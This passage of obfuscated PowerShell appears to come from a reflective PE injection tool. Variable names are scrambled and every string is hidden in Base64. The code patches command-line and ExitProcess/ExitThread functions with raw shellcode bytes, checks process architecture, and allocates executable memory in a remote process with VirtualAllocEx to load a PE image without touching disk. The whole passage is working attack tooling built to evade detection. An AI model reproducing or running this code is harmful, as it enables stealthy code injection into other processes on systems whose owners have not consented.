		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${___/=\______/\_/\} -__/\/\/\__/\_/\/\_ ${/==\_/=\_/=\__/\/}
		${/==\_/=\_/=\__/\/} = ____/\____/====\/= ${/==\_/=\_/=\__/\/} (${___/=\______/\_/\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\/=\_/=\/===\_}, ${/==\_/=\_/=\__/\/}, $false)
		${/==\_/=\_/=\__/\/} = ____/\____/====\/= ${/==\_/=\_/=\__/\/} ${/=\/==\___/=\/\_/}
		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${____/===\___/\/\_} -__/\/\/\__/\_/\/\_ ${/==\_/=\_/=\__/\/}
		$Win32Functions.VirtualProtect.Invoke(${/===\/\_/=\/\/\__}, [UInt32]${/=\__/\___/=\__/\}, [UInt32]${__/\__/\__/\___/=}, [Ref]${__/\__/\__/\___/=}) | Out-Null
		${__/\_____/\_/\_/=} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach (${_/\/=====\_/==\/\} in ${__/\_____/\_/\_/=})
		{
			[IntPtr]${___/=\__/====\/\/} = $Win32Functions.GetModuleHandle.Invoke(${_/\/=====\_/==\/\})
			if (${___/=\__/====\/\/} -ne [IntPtr]::Zero)
			{
				[IntPtr]${__/=\/===\/======} = $Win32Functions.GetProcAddress.Invoke(${___/=\__/====\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]${____/\/==\_/\/=\/} = $Win32Functions.GetProcAddress.Invoke(${___/=\__/====\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if (${__/=\/===\/======} -eq [IntPtr]::Zero -or ${____/\/==\_/\/=\/} -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${__/===\/\/=\_/\__} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${__/\/==\_/=\/===\_})
				${_/=\___/\_/\/=\_/} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${__/\/==\_/=\/===\_})
				${___/\/\/=\/\_/=\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/\/==\_/\/=\/}, [Type][IntPtr])
				${_/\_/=\/\____/==\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\/===\/======}, [Type][IntPtr])
				${/=\/\/==\_/==\_/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/==\___/=\/\_/})
				${/=\/\__/=\/\___/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/==\___/=\/\_/})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/\/\/=\/\_/=\/}, ${/=\/\/==\_/==\_/\}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\_/=\/\____/==\}, ${/=\/\__/=\/\___/=}, $false)
				${/=\___/===\___/\_} += ,(${____/\/==\_/\/=\/}, ${/=\/\/==\_/==\_/\}, ${/=\/==\___/=\/\_/})
				${/=\___/===\___/\_} += ,(${__/=\/===\/======}, ${/=\/\__/=\/\___/=}, ${/=\/==\___/=\/\_/})
				${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualProtect.Invoke(${____/\/==\_/\/=\/}, [UInt32]${/=\/==\___/=\/\_/}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${__/\__/\__/\___/=})
				if (${_/\_/\__/\/=\/\/\} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/===\/\/=\_/\__}, ${____/\/==\_/\/=\/}, $false)
				$Win32Functions.VirtualProtect.Invoke(${____/\/==\_/\/=\/}, [UInt32]${/=\/==\___/=\/\_/}, [UInt32](${__/\__/\__/\___/=}), [Ref]${__/\__/\__/\___/=}) | Out-Null
				${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualProtect.Invoke(${__/=\/===\/======}, [UInt32]${/=\/==\___/=\/\_/}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${__/\__/\__/\___/=})
				if (${_/\_/\__/\/=\/\/\} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\___/\_/\/=\_/}, ${__/=\/===\/======}, $false)
				$Win32Functions.VirtualProtect.Invoke(${__/=\/===\/======}, [UInt32]${/=\/==\___/=\/\_/}, [UInt32](${__/\__/\__/\___/=}), [Ref]${__/\__/\__/\___/=}) | Out-Null
			}
		}
		${/=\___/===\___/\_} = @()
		${/==\_/\/\_/=\__/=} = @() 
		[IntPtr]${___/==\_/\/=\/==\} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if (${___/==\_/\/=\/==\} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]${____/==\_/==\/\_/} = $Win32Functions.GetProcAddress.Invoke(${___/==\_/\/=\/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${____/==\_/==\/\_/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${/==\_/\/\_/=\__/=} += ${____/==\_/==\/\_/}
		[IntPtr]${_/\___/\/==\__/=\} = $Win32Functions.GetProcAddress.Invoke(${___/\___/\___/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${_/\___/\/==\__/=\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${/==\_/\/\_/=\__/=} += ${_/\___/\/==\__/=\}
		[UInt32]${__/\__/\__/\___/=} = 0
		foreach (${______/=\__/\/=\_} in ${/==\_/\/\_/=\__/=})
		{
			${/==\/=\_/\__/\/==} = ${______/=\__/\/=\_}
			[Byte[]]${___/=\______/\_/\} = @(0xbb)
			[Byte[]]${____/===\___/\/\_} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${/=\/==\___/=\/\_/} -eq 8)
			{
				[Byte[]]${___/=\______/\_/\} = @(0x48, 0xbb)
				[Byte[]]${____/===\___/\/\_} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${__/\/\/=\/===\___} = @(0xff, 0xd3)
			${/=\__/\___/=\__/\} = ${___/=\______/\_/\}.Length + ${/=\/==\___/=\/\_/} + ${____/===\___/\/\_}.Length + ${/=\/==\___/=\/\_/} + ${__/\/\/=\/===\___}.Length
			[IntPtr]${/=\/\__/\__/\_/\/} = $Win32Functions.GetProcAddress.Invoke(${___/\___/\___/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if (${/=\/\__/\__/\_/\/} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualProtect.Invoke(${______/=\__/\/=\_}, [UInt32]${/=\__/\___/=\__/\}, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${__/\__/\__/\___/=})
			if (${_/\_/\__/\/=\/\/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${_/\_/=\/=\/\/=\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\__/\___/=\__/\})
			$Win32Functions.memcpy.Invoke(${_/\_/=\/=\/\/=\/=}, ${______/=\__/\/=\_}, [UInt64]${/=\__/\___/=\__/\}) | Out-Null
			${/=\___/===\___/\_} += ,(${______/=\__/\/=\_}, ${_/\_/=\/=\/\/=\/=}, ${/=\__/\___/=\__/\})
			__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${___/=\______/\_/\} -__/\/\/\__/\_/\/\_ ${/==\/=\_/\__/\/==}
			${/==\/=\_/\__/\/==} = ____/\____/====\/= ${/==\/=\_/\__/\/==} (${___/=\______/\_/\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/=\____/=\/==\/=}, ${/==\/=\_/\__/\/==}, $false)
			${/==\/=\_/\__/\/==} = ____/\____/====\/= ${/==\/=\_/\__/\/==} ${/=\/==\___/=\/\_/}
			__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${____/===\___/\/\_} -__/\/\/\__/\_/\/\_ ${/==\/=\_/\__/\/==}
			${/==\/=\_/\__/\/==} = ____/\____/====\/= ${/==\/=\_/\__/\/==} (${____/===\___/\/\_}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/\__/\__/\_/\/}, ${/==\/=\_/\__/\/==}, $false)
			${/==\/=\_/\__/\/==} = ____/\____/====\/= ${/==\/=\_/\__/\/==} ${/=\/==\___/=\/\_/}
			__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${__/\/\/=\/===\___} -__/\/\/\__/\_/\/\_ ${/==\/=\_/\__/\/==}
			$Win32Functions.VirtualProtect.Invoke(${______/=\__/\/=\_}, [UInt32]${/=\__/\___/=\__/\}, [UInt32]${__/\__/\__/\___/=}, [Ref]${__/\__/\__/\___/=}) | Out-Null
		}
		echo ${/=\___/===\___/\_}
	}
	Function ___/\_/\/\___/=\_/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${___/\/=========\__},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]${__/\__/\__/\___/=} = 0
		foreach (${/===\_/\_/\/\/\/=} in ${___/\/=========\__})
		{
			${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualProtect.Invoke(${/===\_/\_/\/\/\/=}[0], [UInt32]${/===\_/\_/\/\/\/=}[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${__/\__/\__/\___/=})
			if (${_/\_/\__/\/=\/\/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			$Win32Functions.memcpy.Invoke(${/===\_/\_/\/\/\/=}[0], ${/===\_/\_/\/\/\/=}[1], [UInt64]${/===\_/\_/\/\/\/=}[2]) | Out-Null
			$Win32Functions.VirtualProtect.Invoke(${/===\_/\_/\/\/\/=}[0], [UInt32]${/===\_/\_/\/\/\/=}[2], [UInt32]${__/\__/\__/\___/=}, [Ref]${__/\__/\__/\___/=}) | Out-Null
		}
	}
	Function ___/\__/=\___/=\__
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/=\____/\_/\/\_/},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${_/\_________/\_/\/}
		)
		$Win32Types = _/=\_/=\_/\/\__/=\
		$Win32Constants = __/\/==\____/=\/=\
		${_/=====\_/=\/\___/} = ____/=\_/\/====\_/ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${__/\/==\__/==\_/=} = ____/\____/====\/= (${__/=\____/\_/\/\_/}) (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${__/\_/\_/==\___/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\/==\__/==\_/=}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		for (${/=\/\/\/\_______/} = 0; ${/=\/\/\/\_______/} -lt ${__/\_/\_/==\___/\}.NumberOfNames; ${/=\/\/\/\_______/}++)
		{
			${__/==\__/\_/\___/} = ____/\____/====\/= (${__/=\____/\_/\/\_/}) (${__/\_/\_/==\___/\}.AddressOfNames + (${/=\/\/\/\_______/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${/==\____/==\/\___} = ____/\____/====\/= (${__/=\____/\_/\/\_/}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/==\__/\_/\___/}, [Type][UInt32]))
			${__/\/\/=\/\/\_/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${/==\____/==\/\___})
			if (${__/\/\/=\/\/\_/=\} -ceq ${_/\_________/\_/\/})
			{
				${_/\_/=\/\_____/=\} = ____/\____/====\/= (${__/=\____/\_/\/\_/}) (${__/\_/\_/==\___/\}.AddressOfNameOrdinals + (${/=\/\/\/\_______/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${_/==\/\__/=\_/\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\_/=\/\_____/=\}, [Type][UInt16])
				${/=====\__/==\_/=\} = ____/\____/====\/= (${__/=\____/\_/\/\_/}) (${__/\_/\_/==\___/\}.AddressOfFunctions + (${_/==\/\__/=\_/\_/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${/=\/=\/=\__/\/===} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=====\__/==\_/=\}, [Type][UInt32])
				return ____/\____/====\/= (${__/=\____/\_/\/\_/}) (${/=\/=\/=\__/\/===})
			}
		}
		return [IntPtr]::Zero
	}
	Function ___/=\_/\__/=\___/
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${__/\_/\__/\/\__/\/},
        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		${/=\/==\___/=\/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$Win32Constants = __/\/==\____/=\/=\
		$Win32Functions = __/\/\__/\/=\__/\_
		$Win32Types = _/=\_/=\_/\/\__/=\
		${___/=\/=\/\_/\_/=} = $false
		if ((${__/\_/\__/\/\__/\/} -ne $null) -and (${__/\_/\__/\/\__/\/} -ne [IntPtr]::Zero))
		{
			${___/=\/=\/\_/\_/=} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${_/=====\_/=\/\___/} = ___/=\_/==\_/\____ -PEBytes $PEBytes -Win32Types $Win32Types
		${___/==\__/\/=\/\_/} = ${_/=====\_/=\/\___/}.OriginalImageBase
		${/===\___/=\/==\/=} = $true
		if (([Int] ${_/=====\_/=\/\___/}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${/===\___/=\/==\/=} = $false
		}
		${_/=\_/==\/\/\_/==} = $true
		if (${___/=\/=\/\_/\_/=} -eq $true)
		{
			${___/\___/\___/\__} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${_/==\/=\__/\___/\} = $Win32Functions.GetProcAddress.Invoke(${___/\___/\___/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${_/==\/=\__/\___/\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]${_/=\/\/=\/==\__/=} = $false
			${_/\_/\__/\/=\/\/\} = $Win32Functions.IsWow64Process.Invoke(${__/\_/\__/\/\__/\/}, [Ref]${_/=\/\/=\/==\__/=})
			if (${_/\_/\__/\/=\/\/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if ((${_/=\/\/=\/==\__/=} -eq $true) -or ((${_/=\/\/=\/==\__/=} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${_/=\_/==\/\/\_/==} = $false
			}
			${/=\/=\/\_/===\__/} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${/=\/=\/\_/===\__/} = $false
			}
			if (${/=\/=\/\_/===\__/} -ne ${_/=\_/==\/\/\_/==})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${_/=\_/==\/\/\_/==} = $false
			}
		}
		if (${_/=\_/==\/\/\_/==} -ne ${_/=====\_/=\/\___/}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]${_/====\_/=\_/\/=\} = [IntPtr]::Zero
        ${/=====\/\_/\/=\_/} = ([Int] ${_/=====\_/=\/\___/}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not ${/=====\/\_/\/=\_/}))
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuACAATwBSACAAdAByAHkAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAC0ARgBvAHIAYwBlAEEAUwBMAFIAIABmAGwAYQBnACAAKABjAG8AdQBsAGQAIABjAGEAdQBzAGUAIABjAHIAYQBzAGgAZQBzACkA'))) -WarningAction Continue
			[IntPtr]${_/====\_/=\_/\/=\} = ${___/==\__/\/=\/\_/}
		}
        elseif ($ForceASLR -and (-not ${/=====\/\_/\/=\_/}))
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAQQBTAEwAUgAgAGIAdQB0ACAALQBGAG8AcgBjAGUAQQBTAEwAUgAgAGkAcwAgAHMAZQB0AC4AIABGAG8AcgBjAGkAbgBnACAAQQBTAEwAUgAgAG8AbgAgAHQAaABlACAAUABFACAAZgBpAGwAZQAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHIAZQBzAHUAbAB0ACAAaQBuACAAYQAgAGMAcgBhAHMAaAAuAA==')))
        }
        if ($ForceASLR -and ${___/=\/=\/\_/\_/=})
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIAB1AHMAZQAgAEYAbwByAGMAZQBBAFMATABSACAAdwBoAGUAbgAgAGwAbwBhAGQAaQBuAGcAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4A'))) -ErrorAction Stop
        }
        if (${___/=\/=\/\_/\_/=} -and (-not ${/=====\/\_/\/=\_/}))
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSAC4AIABDAGEAbgBuAG8AdAAgAGwAbwBhAGQAIABhACAAbgBvAG4ALQBBAFMATABSACAAUABFACAAaQBuACAAdABvACAAYQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwA='))) -ErrorAction Stop
        }
		${__/=\____/\_/\/\_/} = [IntPtr]::Zero				
		${/=\__/\/==\/\_/==} = [IntPtr]::Zero		
		if (${___/=\/=\/\_/\_/=} -eq $true)
		{
			${__/=\____/\_/\/\_/} = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${_/=====\_/=\/\___/}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			${/=\__/\/==\/\_/==} = $Win32Functions.VirtualAllocEx.Invoke(${__/\_/\__/\/\__/\/}, ${_/====\_/=\_/\/=\}, [UIntPtr]${_/=====\_/=\/\___/}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${/=\__/\/==\/\_/==} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${/===\___/=\/==\/=} -eq $true)
			{
				${__/=\____/\_/\/\_/} = $Win32Functions.VirtualAlloc.Invoke(${_/====\_/=\_/\/=\}, [UIntPtr]${_/=====\_/=\/\___/}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				${__/=\____/\_/\/\_/} = $Win32Functions.VirtualAlloc.Invoke(${_/====\_/=\_/\/=\}, [UIntPtr]${_/=====\_/=\/\___/}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			${/=\__/\/==\/\_/==} = ${__/=\____/\_/\/\_/}
		}
		[IntPtr]${/=\/\_/\/==\/\/\/} = ____/\____/====\/= (${__/=\____/\_/\/\_/}) ([Int64]${_/=====\_/=\/\___/}.SizeOfImage)
		if (${__/=\____/\_/\/\_/} -eq [IntPtr]::Zero)
		{ 
